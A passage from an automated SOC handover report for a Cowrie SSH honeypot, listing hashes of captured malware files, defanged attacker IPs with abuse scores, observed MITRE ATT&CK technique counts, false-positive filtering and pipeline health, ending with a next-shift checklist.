| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.16.66[.]255` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 7 |
| `107.175.34[.]74` | US | HostPapa | **100** ⚠️ | 5 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `180.76.234[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `14.103.123[.]16` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `171.231.191[.]10` | VN | Viettel Group | **100** ⚠️ | 0 |
| `122.176.122[.]24` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `171.231.184[.]15` | VN | Viettel Group | **100** ⚠️ | 1 |
| `180.108.64[.]6` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 233 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 109 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 107 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 53 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 53 |

---

## 🔕 False Positive Summary (59 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 52 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 291 cases |
| Tool 34  | Credential Extractor        | ✅ 217 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 59 filtered (20.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 107 priority case(s) shown individually · 18 recon entry/entries in table (5 group(s) consolidating 112 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T09:24:12Z_
